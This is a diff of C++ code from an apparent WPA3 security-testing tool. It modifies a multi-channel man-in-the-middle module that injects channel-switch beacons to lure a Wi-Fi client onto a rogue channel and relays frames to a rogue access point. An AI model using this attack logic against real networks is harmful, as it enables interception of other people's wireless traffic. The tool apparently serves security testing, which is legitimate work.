@@ -1,10 +1,10 @@
-#include <chrono>
-#include <tins/tins.h>
 #include "attacks/mc_mitm/mc_mitm.h"
 #include "attacks/mc_mitm/wifi_util.h"
 #include "logger/error_log.h"
 #include "logger/log.h"
 #include "system/hw_capabilities.h"
+#include <chrono>
+#include <tins/tins.h>
 
 namespace wpa3_tester{
 using namespace std;
@@ -35,21 +35,25 @@ bool McMitm::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) con
 	return false;
 }
 
+//FIXME change bool to PProcess::continue; PProcess::stop (with change to bool for
+
+// not
 bool McMitm::handle_auth_from_client_real(const HWAddress<6> addr1, const Dot11 &dot11){
 	if(addr1 != ap.get(SK::mac)) return false;
 	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()){
 		const auto client_addr = auth->addr2();
 		display_traffic(dot11, "Real channel");
 
-		if(client_state.get_mac() == client_addr)
+		if(client_state.get_mac() == client_addr) {
 			log(LogLevel::WARNING, "Client {} is connecting on real channel, injecting CSA beacon to try to correct.",
 				client_addr);
 
-		send_csa_beacon(1, client_addr);
-		send_csa_beacon();
+			send_csa_beacon(1, client_addr);
+			send_csa_beacon();
 
-		client_state.update_state(ClientState::Sent_to_rogue);
-		return true;
+			client_state.update_state(ClientState::Sent_to_rogue);
+			return true;
+		}
 	}
 	return false;
 }
@@ -131,7 +135,9 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
 		send_to_rogue(*pdu);
 	}
 
-	if(dot11.find_pdu<Dot11Deauthentication>()) client_state.update_state(ClientState::Target);
+	//FIXME this can get forwarded packets from rogue
+	if(dot11.find_pdu<Dot11Deauthentication>())
+		client_state.update_state(ClientState::Target);
 }
 
 void McMitm::power_mgmt_response(HWAddress<6> addr2, const Dot11 &dot11) const{
@@ -160,7 +166,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
 
 	const auto [addr1, addr2] = get_addrs(*pdu, raw);
 	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
-		log(LogLevel::DEBUG, "Unknown frame type");
+		log(LogLevel::DEBUG, "Real channel: Unknown frame type");
 		return;
 	}
 
@@ -174,8 +180,9 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
 	if(dot11->addr1() == ap.get(SK::mac)){ // -> AP
 		if(client_state.get_mac() == addr2) display_traffic(*dot11, "Real channel");
 		// STA -> AP
+		// This can catch packets what are not
 		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>())
-			client_state.update_state(ClientState::Target);
+			client_state.update_state(ClientState::Target_disconnected);
 	} else if(addr2 == ap.get(SK::mac)){ // AP ->
 		//TODO FIXME refactirion
 		handle_from_ap_real(pdu, *dot11, addr1);
